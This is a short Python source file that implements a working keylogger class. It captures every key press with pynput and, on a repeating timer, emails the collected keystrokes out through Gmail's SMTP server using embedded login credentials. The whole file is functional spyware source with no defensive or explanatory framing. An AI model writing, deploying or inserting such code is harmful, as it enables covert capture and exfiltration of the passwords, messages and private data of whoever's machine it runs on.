#!/usr/bin/env python 

import pynput.keyboard
import threading
import smtplib

class Keylogger :
    def __init__(self, time_interval,email ,password):
        self.interval = time_interval
        self.log = "start Keylogger"
        self.email =email
        self.password =password
    def append_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try :
            self.append_log(str(key.char))
        except AttributeError :
            if key == key.space:
                self.append_log(" ")
            else:
                self.append_log(" " + str(key) +" ")
    def report(self):
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self,email ,password ,message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email ,message)
        server.quit()

    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener :
            self.report()
            keyboard_listener.join()

